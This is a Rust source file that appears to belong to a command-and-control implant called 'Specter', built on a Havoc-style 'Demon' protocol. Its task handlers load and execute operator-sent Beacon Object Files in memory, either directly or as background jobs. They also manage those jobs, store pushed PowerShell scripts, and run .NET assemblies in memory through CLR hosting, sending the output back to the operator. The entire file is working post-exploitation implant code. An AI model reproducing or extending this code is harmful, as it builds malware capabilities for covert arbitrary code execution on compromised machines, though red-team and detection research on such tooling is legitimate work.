//! BOF/assembly execution and job management handlers.

use red_cell_common::demon::{DemonCommand, DemonJobCommand};
use tracing::{info, warn};

use super::{
    DispatchResult, MemFileStore, PsScriptStore, Response, decode_utf16le_null, parse_bytes_le,
    parse_u32_le, write_bytes_le, write_u32_le, write_utf16le,
};
use crate::coffeeldr::BofOutputQueue;
use crate::config::SpecterConfig;
use crate::dotnet;
use crate::job::JobStore;

#[cfg(windows)]
use crate::job::JOB_TYPE_THREAD;

use crate::coffeeldr;

// ─── COMMAND_INLINE_EXECUTE (20) ────────────────────────────────────────────

/// Handle a `CommandInlineExecute` task: load and execute a BOF (COFF object file).
///
/// Incoming payload (LE): `[function_name: string][bof_file_id: u32][params_file_id: u32][flags: i32]`
///
/// `flags`:
///   - 0 → non-threaded execution
///   - 1 → threaded execution
///   - 2 → use agent config default (`coffee_threaded`)
///
/// The handler retrieves the BOF object and parameter data from the in-memory
/// file store, then delegates to the [`coffeeldr`] module for COFF loading and
/// execution.  Results are returned as one or more callbacks with the
/// `CommandInlineExecute` command ID.
pub(super) fn handle_inline_execute(
    payload: &[u8],
    request_id: u32,
    config: &SpecterConfig,
    mem_files: &mut MemFileStore,
    job_store: &mut JobStore,
    bof_output_queue: &BofOutputQueue,
) -> DispatchResult {
    // job_store, bof_output_queue, and request_id are only consumed on Windows
    // inside the #[cfg(windows)] block for threaded execution.
    #[cfg(not(windows))]
    let _ = (job_store, bof_output_queue, request_id);

    let mut offset = 0;

    // Parse function name (length-prefixed UTF-8 string)
    let func_name_bytes = match parse_bytes_le(payload, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("InlineExecute: failed to parse function name: {e}");
            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
        }
    };
    let function_name =
        String::from_utf8_lossy(&func_name_bytes).trim_end_matches('\0').to_string();

    let bof_file_id = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InlineExecute: failed to parse bof_file_id: {e}");
            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
        }
    };

    let params_file_id = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InlineExecute: failed to parse params_file_id: {e}");
            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
        }
    };

    let flags = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v as i32,
        Err(e) => {
            warn!("InlineExecute: failed to parse flags: {e}");
            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
        }
    };

    // Retrieve BOF object data from MemFileStore
    let bof_data = match mem_files.get(&bof_file_id) {
        Some(mf) if mf.is_complete() => mf.data.clone(),
        Some(_) => {
            warn!(bof_file_id, "InlineExecute: BOF memfile not complete");
            mem_files.remove(&bof_file_id);
            mem_files.remove(&params_file_id);
            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
        }
        None => {
            warn!(bof_file_id, "InlineExecute: BOF memfile not found");
            mem_files.remove(&params_file_id);
            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
        }
    };

    // Retrieve argument data from MemFileStore (may be empty)
    let arg_data = match mem_files.get(&params_file_id) {
        Some(mf) if mf.is_complete() => mf.data.clone(),
        Some(_) => {
            warn!(params_file_id, "InlineExecute: params memfile not complete");
            mem_files.remove(&bof_file_id);
            mem_files.remove(&params_file_id);
            return inline_execute_error(coffeeldr::BOF_COULD_NOT_RUN);
        }
        None => Vec::new(), // No params is valid
    };

    // Determine threading mode
    let threaded = match flags {
        0 => false,
        1 => true,
        _ => config.coffee_threaded, // use config default
    };

    info!(
        function = %function_name,
        bof_size = bof_data.len(),
        arg_size = arg_data.len(),
        threaded,
        "InlineExecute: executing BOF"
    );

    // Install spawn config into thread-local context so Beacon API callbacks
    // (BeaconGetSpawnTo, BeaconSpawnTemporaryProcess) can access it.
    let bof_ctx = coffeeldr::BofContext {
        spawn64: config.spawn64.as_ref().map(|s| {
            let mut v: Vec<u16> = s.encode_utf16().collect();
            if v.last() != Some(&0) {
                v.push(0);
            }
            v
        }),
        spawn32: config.spawn32.as_ref().map(|s| {
            let mut v: Vec<u16> = s.encode_utf16().collect();
            if v.last() != Some(&0) {
                v.push(0);
            }
            v
        }),
    };
    coffeeldr::set_bof_context(&bof_ctx);

    // On Windows, attempt to run the BOF in a background thread when requested.
    // If the thread spawns successfully, register it in the job store so the
    // operator can suspend/resume/kill it via CommandJob, then return without
    // waiting for the BOF to finish.  On failure (or on non-Windows), fall
    // through to synchronous execution.
    #[cfg(windows)]
    if threaded {
        match coffeeldr::coffee_execute_threaded(
            function_name.clone(),
            bof_data.clone(),
            arg_data.clone(),
            bof_output_queue.clone(),
            request_id,
            bof_ctx.clone(),
        ) {
            Some(handle) => {
                let job_id = job_store.add(JOB_TYPE_THREAD, handle, request_id);
                info!(job_id, function = %function_name, "BOF thread started and registered");
                mem_files.remove(&bof_file_id);
                mem_files.remove(&params_file_id);
                coffeeldr::clear_bof_context();
                // No immediate response — callbacks will be queued in
                // bof_output_queue and drained by the main agent loop.
                return DispatchResult::Ignore;
            }
            None => {
                warn!("InlineExecute: CreateThread failed — falling back to sync execution");
            }
        }
    }

    // Execute the BOF synchronously (non-Windows, or when threaded spawn failed).
    let result = coffeeldr::coffee_execute(&function_name, &bof_data, &arg_data, threaded);
    coffeeldr::clear_bof_context();

    // Clean up memfiles
    mem_files.remove(&bof_file_id);
    mem_files.remove(&params_file_id);

    // Convert BOF callbacks to dispatch responses
    let responses: Vec<Response> = result
        .callbacks
        .into_iter()
        .map(|cb| {
            let mut out = Vec::new();
            write_u32_le(&mut out, cb.callback_type);
            out.extend_from_slice(&cb.payload);
            Response::new(DemonCommand::CommandInlineExecute, out)
        })
        .collect();

    if responses.len() == 1 {
        DispatchResult::Respond(responses.into_iter().next().unwrap_or_else(|| {
            let mut out = Vec::new();
            write_u32_le(&mut out, coffeeldr::BOF_COULD_NOT_RUN);
            Response::new(DemonCommand::CommandInlineExecute, out)
        }))
    } else {
        DispatchResult::MultiRespond(responses)
    }
}

/// Build an inline-execute error response with the given BOF callback type.
fn inline_execute_error(callback_type: u32) -> DispatchResult {
    let mut out = Vec::new();
    write_u32_le(&mut out, callback_type);
    DispatchResult::Respond(Response::new(DemonCommand::CommandInlineExecute, out))
}

// ─── COMMAND_JOB (21) ──────────────────────────────────────────────────────

/// Handle a `CommandJob` task: list, suspend, resume, or kill background jobs.
///
/// Incoming payload (LE): `[subcommand: u32][optional job_id: u32]`
///
/// Outgoing payload (LE):
///   - **List**: `[1: u32][repeated: job_id: u32, type: u32, state: u32]`
///   - **Suspend/Resume/Kill**: `[subcmd: u32][job_id: u32][success: u32]`
pub(super) fn handle_job(payload: &[u8], job_store: &mut JobStore) -> DispatchResult {
    let mut offset = 0;

    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandJob: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonJobCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandJob: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandJob dispatch");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match subcmd {
        DemonJobCommand::List => {
            for job in job_store.list() {
                write_u32_le(&mut out, job.job_id);
                write_u32_le(&mut out, job.job_type);
                write_u32_le(&mut out, job.state);
            }
        }
        DemonJobCommand::Suspend => {
            let job_id = match parse_u32_le(payload, &mut offset) {
                Ok(v) => v,
                Err(e) => {
                    warn!("CommandJob/Suspend: failed to parse job_id: {e}");
                    return DispatchResult::Ignore;
                }
            };
            let success = job_store.suspend(job_id);
            write_u32_le(&mut out, job_id);
            write_u32_le(&mut out, u32::from(success));
        }
        DemonJobCommand::Resume => {
            let job_id = match parse_u32_le(payload, &mut offset) {
                Ok(v) => v,
                Err(e) => {
                    warn!("CommandJob/Resume: failed to parse job_id: {e}");
                    return DispatchResult::Ignore;
                }
            };
            let success = job_store.resume(job_id);
            write_u32_le(&mut out, job_id);
            write_u32_le(&mut out, u32::from(success));
        }
        DemonJobCommand::KillRemove => {
            let job_id = match parse_u32_le(payload, &mut offset) {
                Ok(v) => v,
                Err(e) => {
                    warn!("CommandJob/Kill: failed to parse job_id: {e}");
                    return DispatchResult::Ignore;
                }
            };
            let success = job_store.kill(job_id);
            write_u32_le(&mut out, job_id);
            write_u32_le(&mut out, u32::from(success));
        }
        DemonJobCommand::Died => {
            // Internal callback — the agent detects a tracked process has died
            // and reports it.  Currently a no-op for Specter.
            info!("CommandJob/Died: internal callback (no-op)");
            return DispatchResult::Ignore;
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandJob, out))
}

// ─── COMMAND_PS_IMPORT (0x1011) ────────────────────────────────────────────

/// Handle a `CommandPsImport` task: store a PowerShell script in memory.
///
/// Incoming payload (LE): `[script_mem_file_id: u32]`
///
/// The script bytes are retrieved from the in-memory file store (uploaded via
/// `CommandMemFile`).  If no memfile ID is present in the payload, the raw
/// payload bytes are used directly (backwards-compatible path).
///
/// Response callback: `[output: string]` — empty string on success, error
/// message on failure.
pub(super) fn handle_ps_import(
    payload: &[u8],
    ps_scripts: &mut PsScriptStore,
    mem_files: &mut MemFileStore,
) -> DispatchResult {
    let mut offset = 0;

    // Try to parse a memfile ID first; fall back to raw bytes
    let script_data = if let Ok(mem_file_id) = parse_u32_le(payload, &mut offset) {
        match mem_files.remove(&mem_file_id) {
            Some(mf) if mf.is_complete() => mf.data,
            Some(_) => {
                warn!(mem_file_id, "PsImport: memfile not complete");
                return ps_import_response("PowerShell import failed: incomplete transfer");
            }
            None => {
                // No memfile with this ID — treat remaining payload as script bytes
                if payload.len() > 4 {
                    payload[4..].to_vec()
                } else {
                    return ps_import_response("PowerShell import failed: no script data");
                }
            }
        }
    } else {
        // No u32 parseable — use entire payload as script data
        payload.to_vec()
    };

    if script_data.is_empty() {
        return ps_import_response("PowerShell import failed: empty script");
    }

    info!(size = script_data.len(), "PsImport: script stored");
    *ps_scripts = script_data;

    // Empty string = success
    ps_import_response("")
}

/// Build a `CommandPsImport` callback response.
///
/// Payload (LE): `[output: bytes (UTF-8 string)]` — empty string means success.
fn ps_import_response(message: &str) -> DispatchResult {
    let mut out = Vec::new();
    write_bytes_le(&mut out, message.as_bytes());
    DispatchResult::Respond(Response::new(DemonCommand::CommandPsImport, out))
}

// ─── COMMAND_ASSEMBLY_INLINE_EXECUTE (0x2001) ──────────────────────────────

/// Handle a `CommandAssemblyInlineExecute` task.
///
/// Parses the incoming payload, retrieves the assembly bytes from the memfile
/// store, and calls [`dotnet::dotnet_execute`] to load and invoke the assembly
/// via CLR hosting (COM vtable FFI).
///
/// Incoming payload (LE):
///   `[pipe_name: wstring][app_domain: wstring][net_version: wstring]`
///   `[assembly_mem_file_id: u32][assembly_args: wstring]`
///
/// The assembly PE bytes are retrieved from the in-memory file store.
pub(super) fn handle_assembly_inline_execute(
    payload: &[u8],
    mem_files: &mut MemFileStore,
) -> DispatchResult {
    let mut offset = 0;

    // Parse pipe name (UTF-16LE wstring)
    let pipe_bytes = match parse_bytes_le(payload, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("AssemblyInlineExecute: failed to parse pipe_name: {e}");
            return assembly_error();
        }
    };
    let pipe_name = decode_utf16le_null(&pipe_bytes);

    // Parse AppDomain name
    let domain_bytes = match parse_bytes_le(payload, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("AssemblyInlineExecute: failed to parse app_domain: {e}");
            return assembly_error();
        }
    };
    let app_domain = decode_utf16le_null(&domain_bytes);

    // Parse .NET version
    let version_bytes = match parse_bytes_le(payload, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("AssemblyInlineExecute: failed to parse net_version: {e}");
            return assembly_error();
        }
    };
    let net_version = decode_utf16le_null(&version_bytes);

    // Parse assembly memfile ID
    let mem_file_id = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("AssemblyInlineExecute: failed to parse mem_file_id: {e}");
            return assembly_error();
        }
    };

    // Parse assembly arguments
    let args_bytes = parse_bytes_le(payload, &mut offset).unwrap_or_default();
    let assembly_args = decode_utf16le_null(&args_bytes);

    // Retrieve assembly data from MemFileStore
    let assembly_data = match mem_files.remove(&mem_file_id) {
        Some(mf) if mf.is_complete() => mf.data,
        Some(_) => {
            warn!(mem_file_id, "AssemblyInlineExecute: memfile not complete");
            return assembly_error();
        }
        None => {
            warn!(mem_file_id, "AssemblyInlineExecute: memfile not found");
            return assembly_error();
        }
    };

    info!(
        pipe = %pipe_name,
        domain = %app_domain,
        version = %net_version,
        assembly_size = assembly_data.len(),
        args = %assembly_args,
        "AssemblyInlineExecute: executing .NET assembly via CLR hosting"
    );

    // Execute the assembly
    let result = dotnet::dotnet_execute(
        &pipe_name,
        &app_domain,
        &net_version,
        &assembly_data,
        &assembly_args,
    );

    // Convert callbacks to dispatch responses
    let mut responses: Vec<Response> = result
        .callbacks
        .into_iter()
        .map(|cb| {
            let mut out = Vec::new();
            write_u32_le(&mut out, cb.info_id);
            out.extend_from_slice(&cb.payload);
            Response::new(DemonCommand::CommandAssemblyInlineExecute, out)
        })
        .collect();

    // If there's captured output, send it as a standard output callback
    if !result.output.is_empty() {
        let mut out = Vec::new();
        write_u32_le(&mut out, 0x00); // CALLBACK_OUTPUT
        write_bytes_le(&mut out, &result.output);
        responses.push(Response::new(DemonCommand::CommandOutput, out));
    }

    if responses.len() == 1 {
        DispatchResult::Respond(
            responses.into_iter().next().unwrap_or_else(assembly_error_response),
        )
    } else {
        DispatchResult::MultiRespond(responses)
    }
}

/// Build a `CommandAssemblyInlineExecute` FAILED response.
fn assembly_error() -> DispatchResult {
    DispatchResult::Respond(assembly_error_response())
}

/// Build a single DOTNET_INFO_FAILED response.
fn assembly_error_response() -> Response {
    let mut out = Vec::new();
    write_u32_le(&mut out, dotnet::DOTNET_INFO_FAILED);
    Response::new(DemonCommand::CommandAssemblyInlineExecute, out)
}

// ─── COMMAND_ASSEMBLY_LIST_VERSIONS (0x2003) ───────────────────────────────

/// Handle a `CommandAssemblyListVersions` task: enumerate installed CLR versions.
///
/// No incoming data.
///
/// Outgoing payload (LE): repeated `[version: wstring (UTF-16LE)]` entries.
pub(super) fn handle_assembly_list_versions() -> DispatchResult {
    let versions = dotnet::enumerate_clr_versions();

    info!(count = versions.len(), "AssemblyListVersions: found CLR versions");

    let mut out = Vec::new();
    for version in &versions {
        write_utf16le(&mut out, version);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandAssemblyListVersions, out))
}
